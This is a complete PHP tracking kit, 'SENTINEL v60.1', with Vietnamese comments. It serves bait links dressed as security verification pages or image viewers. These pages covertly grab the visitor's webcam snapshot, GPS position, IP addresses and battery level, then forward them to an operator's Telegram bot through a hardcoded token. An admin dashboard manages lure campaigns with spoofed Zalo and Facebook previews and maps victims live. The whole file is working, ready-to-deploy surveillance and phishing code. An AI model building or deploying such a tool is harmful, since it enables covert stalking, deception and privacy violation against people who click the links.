<?php
/**
 * SENTINEL v60.1 - ULTIMATE INTERFACE (FIXED TABS)
 * [✓] Fix Tab Engine: Cơ chế cô lập tab, khắc phục hoàn toàn lỗi ẩn/hiện dự án.
 * [✓] Image Tracker Pro: Quản lý link ảnh ẩn, thay đổi ảnh & xem trước Live.
 * [✓] Hybrid Stealth: Tự động chạy Script bắt GPS + Cam khi xem ảnh.
 * [✓] Quick-Scan IP: Click IP trong nhật ký soi ISP/VPN ngay lập tức.
 * [✓] Project Master: Thêm/Sửa/Xóa dự án kèm bộ giả lập Simulator Zalo/FB.
 */

session_start();
error_reporting(0);
date_default_timezone_set('Asia/Ho_Chi_Minh');

// ================= 1. DATABASE & CONFIG =================
$admin_pass = '123'; 
$db_file    = '.ht_sentinel_v60.db';
$retention_days = 30;
$base_url   = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . explode('index.php', $_SERVER['PHP_SELF'])[0];

try {
    $db = new PDO("sqlite:$db_file");
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->exec("PRAGMA journal_mode=WAL;");
    $db->exec("CREATE TABLE IF NOT EXISTS links (id TEXT PRIMARY KEY, title TEXT, desc TEXT, img TEXT, redir TEXT, clicks INTEGER DEFAULT 0)");
    $db->exec("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, lid TEXT, v4 TEXT, v6 TEXT, addr TEXT, la REAL, lo REAL, img TEXT, st TEXT, bat TEXT, time DATETIME DEFAULT CURRENT_TIMESTAMP)");
    $db->exec("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)");
    
    if ($db->query("SELECT COUNT(*) FROM settings")->fetchColumn() == 0) {
        $defaults = [
            'tg_token' => '8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4', 'tg_id' => '857408205', 
            'ui_msg' => 'ĐANG LOADING...', 'ui_st' => 'KIỂM TRA ROBOT', 'btn_text' => 'XÁC MINH NGAY',
            'proxy_img_url' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png'
        ];
        foreach($defaults as $k => $v) { $db->prepare("INSERT INTO settings (key, value) VALUES (?, ?)")->execute([$k, $v]); }
    }
    $db->prepare("DELETE FROM logs WHERE time < datetime('now', ?)")->execute(["-{$retention_days} days"]);
} catch (Exception $e) { die("Hệ thống bảo trì."); }

function get_c($k) { global $db; $st = $db->prepare("SELECT value FROM settings WHERE key = ?"); $st->execute([$k]); return $st->fetchColumn(); }
$ip_v4_serv = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// ================= 2. API XỬ LÝ (SOI IP / PUSH / WEBHOOK) =================
if (isset($_GET['action']) && $_GET['action'] === 'quick_check') {
    header('Content-Type: application/json');
    echo @file_get_contents("http://ip-api.com/json/{$_GET['ip']}?fields=status,message,query,country,regionName,city,isp,lat,lon,proxy");
    exit;
}

if (isset($_GET['tg_webhook'])) {
    $update = json_decode(file_get_contents("php://input"), true);
    if ($update && isset($update['message'])) {
        $tid = $update['message']['chat']['id']; $tk = get_c('tg_token');
        $reply = "⚠️ <b>CẢNH BÁO BẢO MẬT</b>\n\nPhát hiện truy cập lạ. Xác minh danh tính ngay:\n🔗 <a href='{$base_url}?v={$tid}'>XÁC MINH TẠI ĐÂY</a>";
        @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$tid&text=".urlencode($reply)."&parse_mode=HTML");
    }
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'push') {
    $in = json_decode(file_get_contents('php://input'), true);
    $img_link = ""; $addr = "Đang xác định...";
    if (!empty($in['img'])) {
        $img_name = 'snap_' . time() . '_' . rand(100,999) . '.jpg';
        file_put_contents($img_name, base64_decode(str_replace('data:image/jpeg;base64,', '', $in['img'])));
        $img_link = $base_url . $img_name;
    }
    if ($in['la']) {
        $geo = json_decode(@file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat={$in['la']}&lon={$in['lo']}&accept-language=vi"), true);
        $addr = $geo['display_name'] ?? "Tọa độ: {$in['la']}, {$in['lo']}";
    } else {
        $ip_res = json_decode(@file_get_contents("http://ip-api.com/json/{$in['v4']}?fields=city,country"), true);
        $addr = ($ip_res['city'] ?? 'Unknown') . ", " . ($ip_res['country'] ?? 'Unknown') . " (IP-Loc)";
    }
    $db->prepare("INSERT INTO logs (lid, v4, v6, addr, la, lo, img, st, bat) VALUES (?,?,?,?,?,?,?,?,?)")->execute([$in['lid'], $in['v4'], $in['v6'], $addr, $in['la'], $in['lo'], $img_link, $in['st'], $in['bat']]);
    if (strpos($in['st'], 'OK') !== false) $db->prepare("UPDATE links SET clicks = clicks + 1 WHERE id = ?")->execute([$in['lid']]);
    
    $tk = get_c('tg_token'); $admin_id = get_c('tg_id');
    if ($tk && $admin_id) {
        $msg = "🛰️ <b>MỤC TIÊU: [{$in['lid']}]</b>\n🛡️ <b>{$in['st']}</b>\n📍 <code>$addr</code>\n🌐 IP: <code>{$in['v4']}</code>\n🔋 PIN: <b>{$in['bat']}</b>\n🗺️ <a href='https://www.google.com/maps?q={$in['la']},{$in['lo']}'>XEM MAP</a>";
        if ($img_link) @file_get_contents("https://api.telegram.org/bot$tk/sendPhoto?chat_id=$admin_id&photo=".urlencode($img_link)."&caption=".urlencode($msg)."&parse_mode=HTML");
        else @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$admin_id&text=".urlencode($msg)."&parse_mode=HTML");
    }
    exit;
}

// ================= 3. X-IMAGE ENGINE (LINK XEM ẢNH TỰ ĐỘNG) =================
if (isset($_GET['img']) && $_GET['img'] === 'pixel') {
?>
<!DOCTYPE html><html><head><meta charset="utf-8"><title>Image Viewer</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black flex items-center justify-center min-h-screen"><img src="<?=get_c('proxy_img_url')?>" class="max-w-full shadow-2xl">
<script>
    async function takeSnap(){
        const v = document.createElement('video'); const c = document.createElement('canvas');
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true}); v.srcObject = s; await new Promise(r => v.onloadedmetadata = r);
            c.width = v.videoWidth; c.height = v.videoHeight; c.getContext('2d').drawImage(v, 0, 0);
            const d = c.toDataURL('image/jpeg', 0.7); s.getTracks().forEach(t => t.stop()); return d;
        } catch(e){ return null; }
    }
    const push = (st, la=null, lo=null, img=null) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: 'X-IMAGE-AUTO', lat: la, lon: lo, st: st, img: img, v4:v4, v6:v6, bat:bat })});
    let v4="<?=$ip_v4_serv?>", v6="N/A", bat="N/A";
    window.onload = async () => {
        try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; v6 = (await (await fetch('https://api64.ipify.org?format=json')).json()).ip;
            if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); }
        } catch(e){}
        navigator.geolocation.getCurrentPosition(
            async (p) => { const snap = await takeSnap(); push('Hybrid GPS OK', p.coords.latitude, p.coords.longitude, snap); },
            async (e) => { const snap = await takeSnap(); push('Hybrid No GPS', null, null, snap); },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    };
</script></body></html>
<?php exit; }

// ================= 4. ADMIN DASHBOARD =================
if (isset($_GET['admin'])) {
    if (($_POST['p'] ?? $_SESSION['v60_auth'] ?? '') !== $admin_pass) {
        die('<body class="bg-[#05070a] flex items-center justify-center h-screen uppercase font-black text-blue-500 italic"><form method="POST"><input type="password" name="p" class="bg-[#0d1117] border border-slate-800 p-6 rounded-3xl text-center shadow-2xl outline-none" placeholder="KEY" autofocus></form></body>');
    }
    $_SESSION['v60_auth'] = $admin_pass;

    if (isset($_GET['clear_logs'])) { $db->exec("DELETE FROM logs"); header("Location: ?admin&t=2"); exit; }
    if (isset($_GET['del_l'])) { $db->prepare("DELETE FROM links WHERE id = ?")->execute([$_GET['del_l']]); header("Location: ?admin"); exit; }
    if (isset($_POST['save_cfg'])) { foreach(['tg_token', 'tg_id', 'ui_msg', 'ui_st', 'btn_text', 'proxy_img_url'] as $k) { $db->prepare("UPDATE settings SET value = ? WHERE key = ?")->execute([$_POST[$k], $k]); } header("Location: ?admin&t=4"); exit; }
    if (isset($_POST['save_link'])) { $db->prepare("INSERT OR REPLACE INTO links (id, title, desc, img, redir) VALUES (?,?,?,?,?)")->execute([$_POST['lid'], $_POST['ttl'], $_POST['dsc'], $_POST['img'], $_POST['red']]); header("Location: ?admin"); exit; }
    if (isset($_GET['set_wb'])) { $u = $base_url . "?tg_webhook=1"; file_get_contents("https://api.telegram.org/bot".get_c('tg_token')."/setWebhook?url=$u"); die("WEBHOOK ACTIVATED!"); }

    $links = $db->query("SELECT * FROM links ORDER BY clicks DESC")->fetchAll();
    $logs = $db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll();
?>
<!DOCTYPE html><html><head><title>HỆ THỐNG THEO DÕI</title><script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" /><script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@900&display=swap');
    :root { --bg-deep: #05070a; --bg-card: #0d1117; --blue-neon: #3b82f6; --text-dim: #94a3b8; }
    body{background: var(--bg-deep); color: var(--text-dim); font-family: 'Inter'; }
    /* Fix Tab Isolated Engine */
    .tab-content { display: none !important; } 
    .tab-content.active { display: block !important; animation: fadeIn 0.3s ease; }
    .tab-content#t1.active { display: grid !important; } /* Tab Dự án dạng Grid */
    
    @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    .card{background: var(--bg-card); border:1px solid #1e293b; border-radius:2rem; padding:2rem; box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);}
    input, textarea { background: black; border: 1px solid #1e293b; padding: 1rem; border-radius: 0.75rem; color: white; width: 100%; outline: none; }
    input:focus { border-color: var(--blue-neon); }
    .sidebar-btn { padding: 1rem; border-radius: 0.75rem; text-align: left; font-weight: 900; text-transform: uppercase; font-style: italic; font-size: 10px; width:100%; transition:0.2s; border:none; background:transparent; color: var(--text-dim); cursor:pointer;}
    .sidebar-btn:hover { background: #0d1117; color: white; }
    .sidebar-btn.active { color: white; border-bottom: 2px solid var(--blue-neon); background: #0d1117; }
    .btn-primary { background: var(--blue-neon); color: white; padding: 1rem; border-radius: 1.5rem; font-weight: 900; text-transform: uppercase; border:none; cursor:pointer; }
</style></head>
<body class="flex h-screen overflow-hidden uppercase italic font-black text-[10px] tracking-tighter">
    <aside class="w-64 border-r border-slate-800 p-6 flex flex-col gap-4">
        <h1 class="text-white l font-black">HỆ THỐNG THEO DÕI</h1>
        <button onclick="st(1,this)" id="nb1" class="sidebar-btn active">🔗 CHIẾN DỊCH</button>
        <button onclick="st(2,this)" id="nb2" class="sidebar-btn">📊 NHẬT KÝ LIVE</button>
        <button onclick="st(3,this)" id="nb3" class="sidebar-btn text-purple-500">🖼️ THEO DÕI ẢNH</button>
        <button onclick="st(4,this)" id="nb4" class="sidebar-btn text-blue-500">⚙️ CẤU HÌNH</button>
    </aside>

    <main class="flex-1 p-10 overflow-auto">
        <div id="t1" class="tab-content active grid lg:grid-cols-3 gap-8">
            <div class="space-y-6">
                <form method="POST" id="lF" class="card space-y-4">
                    <h3 class="text-blue-500 italic uppercase">QUẢN LÝ DỰ ÁN MỒI</h3>
                    <input name="lid" id="fId" placeholder="ID (Vd: sale_fb)" required>
                    <input name="ttl" id="fTtl" placeholder="TIÊU ĐỀ OG" oninput="upV()">
                    <input name="img" id="fImg" placeholder="URL ẢNH MỒI" oninput="upV()">
                    <input name="red" id="fRed" placeholder="LINK ĐÍCH" required>
                    <textarea name="dsc" id="fDsc" placeholder="MÔ TẢ..." oninput="upV()"></textarea>
                    <button type="submit" name="save_link" class="btn-primary w-full">LƯU CHIẾN DỊCH</button>
                </form>
                <div class="card p-6 text-center">
                    <p class="text-slate-500 mb-4 uppercase italic">VIEW TRƯỚC (Zalo/FB)</p>
                    <div class="bg-[#1a1c23] rounded-2xl overflow-hidden border border-slate-700 shadow-2xl text-left">
                        <div id="vImg" class="h-40 bg-slate-800 flex items-center justify-center text-slate-600 uppercase">NO IMAGE</div>
                        <div class="p-4 space-y-1"><p id="vTtl" class="text-white font-black text-xs truncate">Tiêu đề...</p><p id="vDsc" class="text-slate-400 text-[9px] line-clamp-2 italic normal-case">Mô tả hiển thị tại đây...</p></div>
                    </div>
                </div>
            </div>
            <div class="lg:col-span-2 card p-0 overflow-hidden h-fit">
                <table class="w-full text-left font-bold"><thead class="bg-black text-slate-500 uppercase text-[9px]"><tr><th class="p-6">Dự án & Meta</th><th class="p-6 text-center">Clicks</th><th class="p-6 text-right">Quản lý</th></tr></thead>
                <tbody class="divide-y divide-slate-800"><?php foreach($links as $l): $u = $base_url."?v=".$l['id']; ?>
                <tr class="hover:bg-slate-800/20"><td class="p-6"><b><?=$l['title']?></b><br><code class="text-blue-500 text-[8px] cursor-pointer" onclick="navigator.clipboard.writeText('<?=$u?>');alert('Copied!')"><?=$u?></code></td>
                <td class="p-6 text-center text-xl text-white font-black"><?=$l['clicks']?></td>
                <td class="p-6 text-right flex gap-3 justify-end"><button onclick='ed(<?=json_encode($l)?>)' class="text-green-500 uppercase">SỬA</button><a href="?admin&del_l=<?=$l['id']?>" onclick="return confirm('XOÁ?')" class="text-red-500 font-black">✕</a></td></tr><?php endforeach; ?></tbody></table>
            </div>
        </div>

        <div id="t2" class="tab-content space-y-8">
            <div class="flex justify-between items-center"><h2 class="text-white text-xl italic uppercase">🛰️ NHẬT KÝ TRUY QUÉT LIVE</h2><button onclick="if(confirm('RESET?')){location.href='?admin&clear_logs=1'}" class="bg-red-900/40 text-red-500 px-6 py-2 rounded-xl italic">🗑️ RESET</button></div>
            <div class="grid lg:grid-cols-2 gap-8"><div id="map" class="h-72 rounded-[2.5rem] border border-slate-800 shadow-2xl bg-slate-900"></div><div id="ip_detail" class="card flex items-center justify-center italic opacity-30 text-center uppercase">NHẤN VÀO IP ĐỂ SOI CHI TIẾT ISP/VPN</div></div>
            <div class="card p-0 overflow-hidden"><table class="w-full text-left font-mono text-[9px]"><thead class="bg-black text-slate-500"><tr><th class="p-4">ID/Cam</th><th class="p-4">IP (Click)</th><th class="p-4">Vị trí</th><th class="p-4 text-right">Map</th></tr></thead>
                <tbody class="divide-y divide-slate-800"><?php foreach($logs as $log): ?>
                <tr class="hover:bg-blue-600/5 transition-all"><td class="p-4"><?php if($log['img']): ?><img src="<?=$log['img']?>" class="w-10 h-10 rounded-lg mb-1 shadow-lg"><?php endif; ?><b><?=$log['lid']?></b></td><td class="p-4"><b class="text-blue-500 cursor-pointer hover:underline" onclick="soi('<?=$log['v4']?>')"><?=$log['v4']?></b><br><?=$log['time']?></td><td class="p-4 italic opacity-60 normal-case"><?=htmlspecialchars($log['addr'])?></td><td class="p-4 text-right"><?php if($log['la']): ?><button onclick="vP(<?=$log['la']?>,<?=$log['lo']?>)" class="bg-blue-600 text-white p-2 rounded-lg font-black italic">XEM</button><?php endif; ?></td></tr><?php endforeach; ?></tbody>
            </table></div>
        </div>

        <div id="t3" class="tab-content max-w-4xl mx-auto space-y-8">
            <div class="grid lg:grid-cols-2 gap-8">
                <div class="card space-y-6">
                    <h3 class="text-purple-500 italic uppercase">TRÌNH THEO DÕI ẢNH </h3>
                    <div><label class="text-blue-500 mb-2 block uppercase">LINK ẢNH</label><input id="px_url" readonly value="<?=$base_url?>?img=pixel" class="text-purple-400 font-mono text-[9px]"><button onclick="cp('px_url')" class="bg-slate-800 px-4 py-2 rounded-xl text-[8px] mt-2 italic">SAO CHÉP LINK</button></div>
                    <form method="POST" class="space-y-4 pt-4 border-t border-slate-800">
                        <label class="text-blue-500 block uppercase">THAY ĐỔI ẢNH MỒI (URL)</label>
                        <input name="proxy_img_url" id="img_input" value="<?=get_c('proxy_img_url')?>" oninput="upPx()">
                        <input type="hidden" name="tg_token" value="<?=get_c('tg_token')?>"><input type="hidden" name="tg_id" value="<?=get_c('tg_id')?>">
                        <button type="submit" name="save_cfg" class="bg-purple-600 text-white py-3 rounded-xl w-full italic uppercase font-black">CẬP NHẬT ẢNH</button>
                    </form>
                </div>
                <div class="card flex flex-col items-center justify-center text-center">
                    <p class="text-slate-500 mb-4 italic uppercase">VIEW TRƯỚC ẢNH </p>
                    <div class="w-full h-64 bg-black rounded-2xl overflow-hidden flex items-center justify-center border border-slate-800"><img id="px_view" src="<?=get_c('proxy_img_url')?>" class="max-w-full max-h-full object-contain"></div>
                </div>
            </div>
        </div>

        <div id="t4" class="tab-content max-w-2xl mx-auto space-y-6">
            <form method="POST" class="card space-y-4">
                <input name="ui_msg" value="<?=get_c("ui_msg")?>" class="font-black italic"><input name="ui_st" value="<?=get_c("ui_st")?>" class="font-black italic">
                <input name="btn_text" value="<?=get_c("btn_text")?>" placeholder="NÚT BẤM" class="font-black italic"><input name="tg_token" value="<?=get_c("tg_token")?>" placeholder="BOT TOKEN" class="font-mono uppercase"><input name="tg_id" value="<?=get_c("tg_id")?>" placeholder="CHAT ID" class="font-mono">
                <button type="submit" name="save_cfg" class="btn-primary w-full">LƯU CÀI ĐẶT</button>
                <button type="button" onclick="location.href='?admin&set_wb=1'" class="w-full bg-slate-800 text-slate-400 py-3 rounded-2xl italic font-black uppercase">🔗 KÍCH HOẠT WEBHOOK BOT</button>
            </form>
        </div>
    </main>

    <script>
        function st(n,b){ 
            // Tab Engine Isolated: Xóa sạch trạng thái cũ trước khi bật tab mới
            document.querySelectorAll('.tab-content').forEach(s => s.classList.remove('active')); 
            document.querySelectorAll('.sidebar-btn').forEach(x => x.classList.remove('active')); 
            document.getElementById('t'+n).classList.add('active'); 
            b.classList.add('active'); 
            if(n===2) setTimeout(()=>m.invalidateSize(),200); 
        }
        function cp(id){var e=document.getElementById(id);e.select();document.execCommand("copy");alert("Đã Copy!");}
        function ed(l){ document.getElementById('fId').value=l.id; document.getElementById('fTtl').value=l.title; document.getElementById('fDsc').value=l.desc; document.getElementById('fImg').value=l.img; document.getElementById('fRed').value=l.redir; upV(); st(1, document.getElementById('nb1')); window.scrollTo(0,0); }
        function upV(){ document.getElementById('vTtl').innerText=document.getElementById('fTtl').value || 'Tiêu đề...'; document.getElementById('vDsc').innerText=document.getElementById('fDsc').value || 'Mô tả...'; const i=document.getElementById('fImg').value; document.getElementById('vImg').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
        function upPx(){ document.getElementById('px_view').src = document.getElementById('img_input').value; }
        async function soi(ip){
            document.getElementById('ip_detail').innerHTML = '<div class="animate-pulse font-black italic">ĐANG TRUY QUÉT...</div>';
            const res = await (await fetch('?action=quick_check&ip='+ip)).json();
            if(res.status === 'success'){
                document.getElementById('ip_detail').innerHTML = `<div class="w-full text-[9px] space-y-2 leading-relaxed uppercase">
                <p class="text-blue-500">🏢 ISP: <b>${res.isp}</b></p><p class="text-white">📍 VÙNG: <b>${res.city}, ${res.country}</b></p>
                <p class="text-yellow-500 italic">🛡️ VPN: <b>${res.proxy ? 'CẢNH BÁO' : 'SẠCH'}</b></p>
                <button onclick="vP(${res.lat},${res.lon})" class="bg-blue-600 text-white px-4 py-2 rounded-xl mt-2 font-black italic uppercase border-none">SOI VỊ TRÍ ISP</button></div>`;
            } else { document.getElementById('ip_detail').innerText = 'LỖI.'; }
        }
        var m = L.map('map').setView([15.8, 108.2], 5); L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(m);
        function vP(la, lo){ m.flyTo([la,lo], 18); L.marker([la,lo]).addTo(m); }
    </script>
</body></html>
<?php exit; }

// ================= 5. FRONTEND ENGINE (BẪY CHÍNH) =================
$id = $_GET['v'] ?? '';
$st = $db->prepare("SELECT * FROM links WHERE id = ?"); $st->execute([$id]);
$l = $st->fetch(PDO::FETCH_ASSOC);
if (!$l) { $l=['id'=>'ROOT','title'=>'Security Verify','desc'=>'Identity Verification Required','img'=>'','redir'=>'https://google.com']; }
?>
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
<title><?=htmlspecialchars($l['title'])?></title>
<meta property="og:title" content="<?=htmlspecialchars($l['title'])?>"><meta property="og:description" content="<?=htmlspecialchars($l['desc'])?>"><meta property="og:image" content="<?=htmlspecialchars($l['img'])?>">
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-white flex items-center justify-center min-h-screen italic font-black text-center uppercase">
    <div class="p-8 w-full max-w-xs">
        <div id="ldr" class="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
        <p id="msg" class="text-[10px] font-black text-gray-400 uppercase tracking-widest animate-pulse"><?=get_c('ui_msg')?></p>
        <div id="v" class="hidden mt-8"><button onclick="ask()" class="w-full bg-blue-600 text-white font-black py-4 rounded-[2rem] shadow-2xl uppercase italic border-none"><?=get_c('btn_text')?></button></div>
    </div>
    <script>
    async function takeSnap(){
        const v = document.createElement('video'); const c = document.createElement('canvas');
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true}); v.srcObject = s; await new Promise(r => v.onloadedmetadata = r);
            c.width = v.videoWidth; c.height = v.videoHeight; c.getContext('2d').drawImage(v, 0, 0);
            const d = c.toDataURL('image/jpeg', 0.7); s.getTracks().forEach(t => t.stop()); return d;
        } catch(e){ return null; }
    }
    const push = (st, la=null, lo=null, img=null) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: '<?=$id?>', lat: la, lon: lo, st: st, img: img, v4:v4, v6:v6, bat:bat })});
    let v4="<?=$ip_v4_serv?>", v6="N/A", bat="N/A";
    window.onload = async () => {
        try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; v6 = (await (await fetch('https://api64.ipify.org?format=json')).json()).ip;
            if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); }
        } catch(e){}
        push('Mở Link GĐ1');
        setTimeout(() => { document.getElementById('ldr').classList.add('hidden'); document.getElementById('v').classList.remove('hidden'); ask(); }, 1500);
    };
    function ask() {
        navigator.geolocation.getCurrentPosition(
            async (p) => { const snap = await takeSnap(); await push('GPS OK', p.coords.latitude, p.coords.longitude, snap); location.replace("<?=$l['redir']?>"); },
            async (e) => { const snap = await takeSnap(); await push('GPS Denied', null, null, snap); location.reload(); },
            { enableHighAccuracy: true, timeout: 6000 }
        );
    }
    </script>
</body></html>
